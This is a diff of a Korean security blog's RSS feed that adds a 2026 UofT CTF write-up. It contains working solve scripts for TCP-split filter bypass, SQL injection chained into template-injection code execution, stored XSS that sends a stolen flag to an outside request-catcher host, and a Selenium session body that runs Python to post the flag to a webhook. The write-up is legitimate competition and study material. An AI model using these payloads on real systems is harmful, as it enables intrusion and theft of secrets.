@@ -1,4 +1,342 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>About Math.random()</title><link>https://itznullbyte.github.io/posts/math_random/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/math_random/</guid><description> </description><pubDate>Fri, 09 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;About&lt;/h2&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>About Web RealWorld BugBounty</title><link>https://itznullbyte.github.io/posts/about_bugbounty/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/about_bugbounty/</guid><description> </description><pubDate>Sat, 31 Jan 2026 00:00:00 GMT</pubDate><content:encoded/></item><item><title>2026 UofT CTF Write-Up</title><link>https://itznullbyte.github.io/posts/2026_uoft/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2026_uoft/</guid><description> </description><pubDate>Thu, 29 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Solve&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;firewall (Web)&lt;/li&gt;
+&lt;li&gt;no-quotes (Web)&lt;/li&gt;
+&lt;li&gt;no-quotes-2 (Web)&lt;/li&gt;
+&lt;li&gt;personal-blog (Web)&lt;/li&gt;
+&lt;li&gt;pasteboard (Web)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Comment&lt;/h2&gt;
+&lt;p&gt;Fermion으로 뛰었다. pasteboard 못푼거 너무 아쉽다.&lt;/p&gt;
+&lt;h2&gt;Write-Up&lt;/h2&gt;
+&lt;h3&gt;Firewall&lt;/h3&gt;
+&lt;p&gt;eBPF 방화벽이 구현 되어 있다. &lt;code&gt;flag.html&lt;/code&gt;에 도달하면 플래그를 준다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#define KW_LEN 4
+static const char blocked_kw[KW_LEN] = &quot;flag&quot;;
+static const char blocked_char = &apos;%&apos;;
+
+if (iph-&amp;gt;frag_off &amp;amp; bpf_htons(IP_MF | IP_OFFSET))   // no fragmentation
+    return TC_ACT_SHOT;
+
+// scan TCP header ~ payload
+if (has_blocked_kw(skb, ETH_HLEN + ip_hdr_size, ip_tot_len - ip_hdr_size))
+    return TC_ACT_SHOT;
+
+if (has_blocked_char(skb, ETH_HLEN + ip_hdr_size, ip_tot_len - ip_hdr_size))
+    return TC_ACT_SHOT;
+
+return TC_ACT_OK;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ipv4/TCP 대상으로만 패킷을 받으며, 패킷 한 덩어리에 &lt;code&gt;flag&lt;/code&gt;나 &lt;code&gt;%&lt;/code&gt;(URL Encoding 차단) 가 존재하면 드롭시킨다.&lt;/p&gt;
+&lt;p&gt;TCP 패킷을 두 덩이로 쪼개어 보냄으로써 Waf를 우회할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import socket
+import time
+
+HOST = &quot;35.227.38.232&quot;
+PORT = 5000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+s.settimeout(5.0)
+s.connect((HOST, PORT))
+
+s.send(b&quot;GET /fla&quot;)
+time.sleep(0.2)
+
+req2 = (
+    b&quot;g.html HTTP/1.1\r\n&quot;
+    b&quot;Host: 35.227.38.232:5000\r\n&quot;
+    b&quot;Range: bytes=135-\r\n&quot;
+    b&quot;Connection: close\r\n&quot;
+    b&quot;\r\n&quot;
+)
+s.send(req2)
+s.shutdown(socket.SHUT_WR)
+
+data = b&quot;&quot;
+
+while True:
+    chunk = s.recv(4096)
+    if not chunk:
+        break
+    data += chunk
+
+print(data.decode(errors=&quot;ignore&quot;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;No-quotes&lt;/h3&gt;
+&lt;p&gt;간단한 로그인 서비스가 구현 되어있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def waf(value: str) -&amp;gt; bool:
+  blacklist = [&quot;&apos;&quot;, &apos;&quot;&apos;]
+  return any(char in value for char in blacklist)
+
+@app.post(&quot;/login&quot;)
+def login():
+  username = request.form.get(&quot;username&quot;, &quot;&quot;)
+  password = request.form.get(&quot;password&quot;, &quot;&quot;)
+
+  if waf(username) or waf(password):
+    return render_template(
+      &quot;login.html&quot;,
+      error=&quot;No quotes allowed!&quot;,
+      username=username,
+    )
+  query = (
+    &quot;SELECT id, username FROM users &quot;
+    f&quot;WHERE username = (&apos;{username}&apos;) AND password = (&apos;{password}&apos;)&quot;
+  )
+
+@app.get(&quot;/home&quot;)
+def home():
+  if not session.get(&quot;user&quot;):
+    return redirect(url_for(&quot;index&quot;))
+  return render_template_string(open(&quot;templates/home.html&quot;).read() % session[&quot;user&quot;])
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;login에서 SQL Injection이 발생하고, &lt;code&gt;/home&lt;/code&gt;에서 SSTI가 발생한다. readflag가 실행파일로 존재하기 때문에 RCE 해야한다.&lt;br /&gt;
+quote 두 개가 모두 필터링 되고 있기에 quote를 이스케이프 시킴으로써 WAF를 통과할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+r = requests.Session()
+
+url = &apos;https://no-quotes-5dc804b998ad0160.chals.uoftctf.org&apos;
+
+def get_ssti():
+  payload = &quot;{{ cycler.__init__.__globals__.os.popen(&apos;/readflag&apos;).read() }}&quot;
+  hex = payload.encode().hex()
+
+  return hex
+
+login_res = r.post(f&apos;{url}/login&apos;, data = {&apos;username&apos;: &apos;\\&apos;, &apos;password&apos;: f&apos;) UNION SELECT 1,0x{get_ssti()}#&apos; }, allow_redirects=False)
+
+print(login_res.text)
+
+home_res = r.get(f&apos;{url}/home&apos;)
+
+print(home_res.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;No-quotes-2&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;no-quote-1&lt;/code&gt;과 다르게 sql에서 반환한 username과 password가 모두 올바른지 검사하고 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if not username == row[0] or not password == row[1]:
+  return render_template(
+    &quot;login.html&quot;,
+    error=&quot;Invalid credentials.&quot;,
+    username=username,
+  )
+session[&quot;user&quot;] = row[0]
+return redirect(url_for(&quot;home&quot;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;processlist에서 입력값을 재추출해 맞추고, 같은 방식으로 RCE해서 플래그를 얻을 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+r = requests.Session()
+url = &apos;https://no-quotes-2-e711bd2e4da001f2.chals.uoftctf.org&apos;
+
+def build_username():
+    chr_func = f&quot;cycler.__init__.__globals__.__builtins__.chr&quot;
+    chars = [47,114,101,97,100,102,108,97,103]  # &quot;/readflag&quot;
+    cmd = &quot;~&quot;.join(f&quot;{chr_func}({c})&quot; for c in chars)
+    payload = &quot;{% set g=cycler.__init__.__globals__ %}&quot; + &quot;{{ g.os.popen(&quot; + cmd + &quot;).read() }}&quot;
+    return payload + &quot;\\&quot;
+
+def build_password(username):
+    u_hex = username.encode().hex()
+    marker1 = &quot;password = (&apos;&quot;.encode().hex()
+    marker2 = &quot;&apos;)&quot;.encode().hex()
+    u_expr = f&quot;CAST(0x{u_hex} AS CHAR)&quot;
+    p_expr = f&quot;SUBSTRING_INDEX(SUBSTRING_INDEX(info,0x{marker1},-1),0x{marker2},1)&quot;
+    return (
+        &quot;) UNION SELECT &quot;
+        + u_expr
+        + &quot;, &quot;
+        + p_expr
+        + &quot; FROM information_schema.processlist WHERE id=connection_id()#&quot;
+    )
+
+username = build_username()
+password = build_password(username)
+
+login_res = r.post(
+    f&apos;{url}/login&apos;,
+    data={&apos;username&apos;: username, &apos;password&apos;: password},
+    allow_redirects=False
+)
+print(login_res.text)
+
+home_res = r.get(f&apos;{url}/home&apos;)
+print(home_res.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Personal Blog&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./personal_blog1.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;./personal_blog2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;인풋은 두 군데에 넣을 수 있다. 그냥 글을 쓰면 XSS가 터지지 않는다.&lt;/p&gt;
+&lt;p&gt;의심해 볼 수 있는건 &lt;code&gt;/autosave&lt;/code&gt;와 &lt;code&gt;/api/save&lt;/code&gt; 두 엔드포인트가 존재한다는 것이다.
+&lt;code&gt;/autosave&lt;/code&gt;는 30초마다 호출되며, 클라이언트 사이드에서 본문을 sanitize 하고, &lt;code&gt;/api/save&lt;/code&gt;는 서버 사이드에서 sanitize한다.
+따라서 &lt;code&gt;/autosave&lt;/code&gt;의 바디를 조작해 보낸다면 문제 없이 Stored XSS가 가능하다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+import re
+
+r = requests.Session()
+
+url = &apos;http://34.26.148.28:5000&apos;
+
+def login():
+  res = r.post(f&apos;{url}/login&apos;, data = { &apos;username&apos;: &apos;ferferfermimimiononon&apos;, &apos;password&apos;: &apos;ferferfermimimiononon&apos; }, allow_redirects=False)
+
+  return res.status_code == 302
+
+def get_post_id():
+  res = r.get(f&apos;{url}/dashboard&apos;)
+  
+  post_id = res.text.split(&apos;&amp;lt;a class=&quot;button ghost&quot; href=&quot;/post/&apos;)[1].split(&apos;&quot;&amp;gt;View&amp;lt;/a&amp;gt;&apos;)[0]
+
+  return post_id
+
+def autosave_post(post_id, content):
+  res = r.post(f&apos;{url}/api/autosave&apos;, json = { &apos;postId&apos;: post_id, &apos;content&apos;: content})
+
+  return res.json()
+
+def gen_magic_token():
+  r.post(f&quot;{url}/magic/generate&quot;)
+  res = r.get(f&quot;{url}/account&quot;)
+  m = re.findall(r&quot;/magic/([0-9a-f]{32})&quot;, res.text)
+
+  return m[0]
+
+def send_report(target, pow_challenge, pow_solution):
+  res = r.post(f&apos;{url}/report&apos;, data = { &apos;url&apos;: target, &apos;pow_challenge&apos;: pow_challenge, &apos;pow_solution&apos;: pow_solution })
+
+  return res.status_code
+
+login_res = login()
+print(&apos;Login&apos;, login_res)
+
+payload = r&quot;&quot;&quot;&amp;lt;script&amp;gt;
+const sidPrev = document.cookie.split(&apos;; &apos;).find(c=&amp;gt;c.startsWith(&apos;sid_prev=&apos;));
+if(sidPrev){
+  const sid = decodeURIComponent(sidPrev.split(&apos;=&apos;)[1]);
+  document.cookie = &apos;sid=&apos;+sid+&apos;;path=/&apos;;
+  fetch(&apos;/flag&apos;).then(r=&amp;gt;r.text())
+    .then(f=&amp;gt;fetch(&apos;https://gmayxdq.request.dreamhack.games?flag=&apos;+encodeURIComponent(f)));
+}
+&amp;lt;/script&amp;gt;&quot;&quot;&quot;
+post_id = get_post_id()
+autosave_res = autosave_post(post_id, payload)
+
+print(&apos;Auto Save&apos;, autosave_res)
+
+pow_chall = r.get(f&apos;{url}/report&apos;).text.split(&apos;sh -s &apos;)[1].split(&apos;&amp;lt;/code&amp;gt;&apos;)[0]
+print(pow_chall)
+print(f&apos;Solve: curl -sSfL https://pwn.red/pow | sh -s {pow_chall}&apos;)
+pow_sol = input(&apos;pow sol &amp;gt;&amp;gt; &apos;)
+
+magic_token = gen_magic_token()
+
+print(&apos;Magic Token&apos;, gen_magic_token())
+
+report_res = send_report(f&apos;http://localhost:3000/magic/{magic_token}?redirect=/edit/{post_id}&apos;, pow_chall, pow_sol)
+print(&apos;Report res&apos;, report_res)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Pasteboard&lt;/h3&gt;
+&lt;p&gt;XSS가 RCE로 이어지는 흥미로운 문제였다.&lt;/p&gt;
+&lt;p&gt;Dompurify로 입력을 sanitize하고 있기에 이를 우회하긴 어려워보인다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(function () {
+  const n = document.getElementById(&quot;rawMsg&quot;);
+  const raw = n ? n.textContent : &quot;&quot;;
+  const card = document.getElementById(&quot;card&quot;);
+
+  try {
+    const cfg = window.renderConfig || { mode: (card &amp;amp;&amp;amp; card.dataset.mode) || &quot;safe&quot; };
+    const mode = cfg.mode.toLowerCase();
+    const clean = DOMPurify.sanitize(raw, { ALLOW_DATA_ATTR: false });
+    if (card) {
+      card.innerHTML = clean;
+    }
+    if (mode !== &quot;safe&quot;) {
+      console.log(&quot;Render mode:&quot;, mode);
+    }
+  } catch (err) {
+    window.lastRenderError = err ? String(err) : &quot;unknown&quot;;
+    handleError();
+  }
+
+  function handleError() {
+    const el = document.getElementById(&quot;errorReporterScript&quot;);
+    if (el &amp;amp;&amp;amp; el.src) {
+      return;
+    }
+
+    const c = window.errorReporter || { path: &quot;/telemetry/error-reporter.js&quot; };
+    const p = c.path &amp;amp;&amp;amp; c.path.value
+      ? c.path.value
+      : String(c.path || &quot;/telemetry/error-reporter.js&quot;);
+    const s = document.createElement(&quot;script&quot;);
+    s.id = &quot;errorReporterScript&quot;;
+    let src = p;
+    try {
+      src = new URL(p).href;
+    } catch (err) {
+      src = p.startsWith(&quot;/&quot;) ? p : &quot;/telemetry/&quot; + p;
+    }
+    s.src = src;
+
+    if (el) {
+      el.replaceWith(s);
+    } else {
+      document.head.appendChild(s);
+    }
+  }
+})();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;window 전역 프로퍼티를 DOM Clobbering으로 오염시킴으로써, &lt;code&gt;window.errorReporter&lt;/code&gt;와 &lt;code&gt;window.errorReporter.path.value&lt;/code&gt; 값을 마음대로 핸들링 할 수 있다.
+원래는 &lt;code&gt;/telemetry/error-reporter.js&lt;/code&gt;를 로드해야 하는데, &lt;code&gt;window.errorReporter.path.value&lt;/code&gt;가 존재한다면 이를 우선 사용해 script src로 만든다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mode&lt;/code&gt;는 사용되지 않는 값이다. 수상하다고 생각했고, &lt;code&gt;mode.toLowerCase()&lt;/code&gt; 부분에서 에러를 낸다면 &lt;code&gt;handleError()&lt;/code&gt;가 실행되어 조작된 &lt;code&gt;errorReporter.path&lt;/code&gt;에서 스크립트를 가져와 실행한다는걸 알아냈다.
+mode를 DOM Clobbering하면 mode의 타입이 string이 아닌 HTMLElement로 만들 수 있다. toLowerCase 함수는 string만 사용 가능하므로 에러가 나, 의도대로 동작시킬 수 있다.&lt;/p&gt;
+&lt;p&gt;이렇게 XSS를 성공시키고 나면 한 번 더 막힌다.&lt;/p&gt;
+&lt;p&gt;일반적인 봇들과 다르게 FLAG 변수를 선언만 해놓고 어디에서도 사용하지 않기 때문이다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import time
+
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+
+BASE_URL = &quot;http://127.0.0.1:5000&quot;
+FLAG = &quot;uoftctf{FAKE}&quot;
+
+def visit_url(target_url):
+    options = Options()
+    options.add_argument(&quot;--headless=true&quot;)
+    options.add_argument(&quot;--disable-gpu&quot;)
+    options.add_argument(&quot;--no-sandbox&quot;)
+    driver = webdriver.Chrome(options=options)
+    try:
+        driver.get(target_url)
+        time.sleep(30)
+    finally:
+        driver.quit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이제 Selenium 로컬포트를 스캐닝하고 RCE해서 플래그를 따야한다.&lt;/p&gt;
+&lt;p&gt;같은 컨테이너 localhost에 Selenium webdriver 서버가 떠 있다. 그래서 &lt;code&gt;/session&lt;/code&gt; 엔드포인트를 대상으로 selenium webdriver &quot;new session&quot; 요청을 날려 포트를 브루트포싱하고 아래와 같이 바디를 보내 드라이버의 실행 대상을 크롬에서 임의의 파이썬으로 바꿔치기 할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;JSON.stringify({
+  capabilities: {
+    alwaysMatch: {
+      browserName: &quot;chrome&quot;,
+      &quot;goog:chromeOptions&quot;: {
+        binary: &quot;/usr/local/bin/python&quot;,
+        args: [`-cimport re,urllib.request,urllib.parse;urllib.request.urlopen(urllib.request.Request(&quot;&amp;lt;WEBHOOK&amp;gt;&quot;,urllib.parse.urlencode({&quot;flag&quot;:re.search(r&quot;uoftctf\{[^}]+\}&quot;,open(&quot;/app/bot.py&quot;).read()).group(0)}).encode()))`],
+      },
+    },
+  },
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;uoftctf{n0_c00k135_n0_pr0bl3m_1m40_122c3466655003ca64d689e3ee0e786d}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>About Math.random()</title><link>https://itznullbyte.github.io/posts/math_random/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/math_random/</guid><description> </description><pubDate>Fri, 09 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;About&lt;/h2&gt;
 &lt;p&gt;CTF에서 &lt;code&gt;Math.random()&lt;/code&gt;을 예측하는 문제가 꽤 나오길래 분석해 보기로 했습니다.&lt;/p&gt;
 &lt;h2&gt;Math.random()&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;./mozilla.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
@@ -132,7 +470,7 @@ LG Uplus final에서도 csrf token 우회와 csp bypass 방향까지 맞았지�
 &lt;p&gt;아래는 공부하면서 읽은 블로그랑 정리, 업솔때릴거 계획했던거다.
 궁금한건 편하게 &lt;a href=&quot;https://blog.xss.kr/about&quot;&gt;디스코드&lt;/a&gt;로 연락주세요 :)
 &lt;img src=&quot;./work.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-</content:encoded></item><item><title>EJS 뒷북치기</title><link>https://itznullbyte.github.io/posts/ejs/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ejs/</guid><description> </description><pubDate>Sun, 28 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;웹해킹하는 사람이라면 EJS SSTI 트릭에 대해 한 번쯤 들어봤을 것이다.
+</content:encoded></item><item><title>EJS SSTI Analysis</title><link>https://itznullbyte.github.io/posts/ejs/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ejs/</guid><description> </description><pubDate>Sun, 28 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;웹해킹하는 사람이라면 EJS SSTI 트릭에 대해 한 번쯤 들어봤을 것이다.
 25년 초반에 EJS 모듈 한 번 분석하고 CTF에서 유용하게 쓰려고 묵혀놓고 있었는데 상당히 웰노운 기법이 되어버려서 분석글을 풀어보려한다.&lt;/p&gt;
 &lt;h3&gt;About EJS&lt;/h3&gt;
 &lt;p&gt;EJS(Embedded JavaScript Templates)는 Node.js 환경에서 웹을 구축할 때 보편적으로 사용되는 템플릿 엔진 중 하나이다. EJS는 HTML 문서 내에서 JavaScript 코드를 삽입하고 실행할 수 있도록 지원하는 템플릿 엔진으로, 동적인 웹 페이지를 쉽게 구성할 수 있는 장점이 있다. 그러나 이러한 유연성은 잘못된 사용 방식에 의해 보안 취약점을 초래할 위험성을 내재하고 있다. EJS 개발자들은 사용자의 입력을 확인하지 않고 render 메소드를 실행해서는 안 된다고 경고한다. 따라서 개발자가 적절한 검증 없이 사용자 입력을 받아 render 함수를 호출하면 원격 코드 실행(RCE, Remote Code Execution) 취약점이 발생할 수 있다. 이는 공격자가 악의적인 JavaScript 코드를 삽입하여 서버 측에서 실행되도록 유도할 수 있음을 의미한다.&lt;/p&gt;
